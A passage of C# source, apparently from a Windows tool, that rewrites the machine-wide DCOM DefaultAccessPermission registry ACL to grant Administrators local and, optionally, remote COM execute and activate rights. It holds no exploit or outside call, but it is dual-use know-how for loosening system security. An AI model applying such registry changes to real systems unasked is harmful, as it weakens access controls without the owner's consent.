        Console.WriteLine("[+] Done, results:");
        Console.Write(DictToTable(results));
    }

    private void EnsureGlobalPermissions()
    {
        RegistryKey oleKey = this.localMachineKey.OpenSubKey(OleKeyPath, true);
        var value = oleKey.GetValue("DefaultAccessPermission");

        RawSecurityDescriptor sd;
        RawAcl acl;

        if (value == null)
        {
            System.Console.WriteLine("[+] Default Access Permission not found. No need to fix.");
            return;
        }
        else
        {
            sd = new RawSecurityDescriptor(value as byte[], 0);
        }
        acl = sd.DiscretionaryAcl;
        bool found = false;
        foreach (CommonAce ca in acl)
        {
            if (ca.SecurityIdentifier.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid))
            {
                if(this.isRemote){
                    //ensure local and network access is set
                    ca.AccessMask |= ComACLRights.COM_RIGHTS_EXECUTE | ComACLRights.COM_RIGHTS_EXECUTE_LOCAL | ComACLRights.COM_RIGHTS_ACTIVATE_LOCAL
                    | ComACLRights.COM_RIGHTS_ACTIVATE_REMOTE | ComACLRights.COM_RIGHTS_EXECUTE_REMOTE; // We would like local and remote access
                }
                else
                {
                    ca.AccessMask |= ComACLRights.COM_RIGHTS_EXECUTE | ComACLRights.COM_RIGHTS_EXECUTE_LOCAL | ComACLRights.COM_RIGHTS_ACTIVATE_LOCAL; // We would like local access
                }

                found = true;
                break;
            }
        }
        if (!found)
        {
            // Administrator was not found.  Add it to the ACL
            SecurityIdentifier si = new SecurityIdentifier(
                WellKnownSidType.BuiltinAdministratorsSid, null);
            CommonAce ca = new CommonAce(
                AceFlags.None,
                AceQualifier.AccessAllowed,
                ComACLRights.COM_RIGHTS_EXECUTE | ComACLRights.COM_RIGHTS_EXECUTE_LOCAL | ComACLRights.COM_RIGHTS_ACTIVATE_LOCAL,
                si,
                false,
                null);
            acl.InsertAce(acl.Count, ca);
        }
        //re-set the ACL
        sd.DiscretionaryAcl = acl;

        byte[] binaryform = new byte[sd.BinaryLength];
        sd.GetBinaryForm(binaryform, 0);
        oleKey.SetValue("DefaultAccessPermission", binaryform, RegistryValueKind.Binary);
    }
}
```

